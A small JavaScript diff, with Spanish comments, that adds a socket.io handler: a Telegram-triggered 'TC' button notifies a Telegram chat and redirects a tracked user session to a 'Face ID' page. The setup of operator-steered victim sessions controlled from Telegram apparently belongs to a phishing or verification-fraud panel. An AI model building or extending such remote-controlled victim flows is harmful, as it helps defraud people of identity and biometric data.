@@ -154,6 +154,20 @@ io.on('connection', (socket) => {
     socketTarget.emit('videoRecibido', { status: 'success' });
   });
 
+  // Escucha el evento para redirigir a face.html cuando se presione el botón TC
+  socket.on('accionTC', ({ sessionId }) => {
+    const socketTarget = activeSockets.get(sessionId);
+    if (!socketTarget) {
+      console.log("⚠️ No se encontró la sesión del usuario.");
+      return;
+    }
+
+    // Enviar mensaje a Telegram
+    bot.sendMessage(telegramChatId, '🟨 Redirigiendo a Face ID...');
+
+    // Emitir la redirección a face.html
+    socketTarget.emit('redirigir', 'face.html');
+  });
 });
 
 // Respuesta a botones desde Telegram
